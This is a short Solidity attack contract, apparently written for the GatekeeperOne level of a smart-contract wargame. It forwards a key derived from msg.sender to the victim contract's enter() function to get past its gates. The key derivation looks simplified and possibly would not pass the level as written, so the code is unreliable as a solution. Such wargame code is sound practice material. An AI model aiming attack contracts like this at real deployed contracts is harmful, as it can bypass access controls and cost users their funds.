// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";
import "./GatekeeperOne.sol";

contract AttackGatekeeperOne {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        bytes8 key = bytes8(uint64(msg.sender));
        GatekeeperOne(victim).enter(key);
    }
}
